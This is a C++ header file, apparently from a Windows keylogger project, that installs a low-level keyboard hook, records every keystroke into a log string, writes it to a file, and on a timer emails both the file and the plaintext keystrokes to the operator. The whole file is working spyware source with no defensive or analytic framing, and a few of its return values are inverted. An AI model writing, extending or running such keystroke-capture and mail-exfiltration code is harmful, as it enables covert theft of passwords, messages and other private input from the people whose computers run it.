#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

//here we capture all the keyboard events
//this string contains all the keystrokes
std::string keylog = "";

void TimerSendMail()
{
    if(keylog.empty())
        return;
    //encrypted log
    std::string last_file = IO::WriteLog(keylog);

    if(last_file.empty())
    {
        Helper::WriteAppLog("File creation was not successfull. Keylog '" + keylog + "'");
        return;
    }
    int x = Mail::SendMail("Log [" + last_file + "]",
                           "Hi ;)\nThe file has been attached to this mail :)\n"
                           "For testing, enjoy:\n" + keylog,
                           IO::GetOurPath(true) + last_file);

    if(x!= 7)
         Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(x));
    else
        keylog = "";

}

  Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite);

  HHOOK eHook = NULL;

  LRESULT OurKeyboardProc(int nCode , WPARAM wparam, LPARAM lparam)
  {
      if(nCode < 0)
         CallNextHookEx(eHook, nCode ,wparam , lparam);

      KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;

      if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)//if the key is pressed
      {
          keylog += Keys::KEYS[kbs->vkCode].Name;
          if(kbs->vkCode == VK_RETURN)
             keylog += '\n';//if somebody presses the enter key it will go into new line
      }
      else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
      {
          DWORD key = kbs->vkCode;
          if(key == VK_CONTROL
                 || key == VK_LCONTROL
                 || key == VK_RCONTROL
                 || key == VK_SHIFT
                 || key == VK_RSHIFT
                 || key == VK_LSHIFT
                 || key == VK_MENU
                 || key == VK_LMENU
                 || key == VK_RMENU
                 || key == VK_CAPITAL
                 || key == VK_NUMLOCK
                 || key == VK_LWIN
                 || key == VK_RWIN
             )
             {
                 std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
                 KeyName.insert(1,"/");
                 keylog += KeyName;
                 //[SHIFT][a][b][c][/SHIFT] THIS SLASH IS PRINTED
             }
      }

      return CallNextHookEx(eHook, nCode ,wparam , lparam);

  }

bool InstallHook()
{
    //sync way to start a timer
    Helper::WriteAppLog("Hook Started..Timer started");
    MailTimer.Start(true);

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc,
                              GetModuleHandle(NULL), 0);
    return eHook == NULL;

}

bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool)b;
}

bool IsHooked()
{
    return (bool)(eHook == NULL);
}

#endif // KEYBHOOK_H
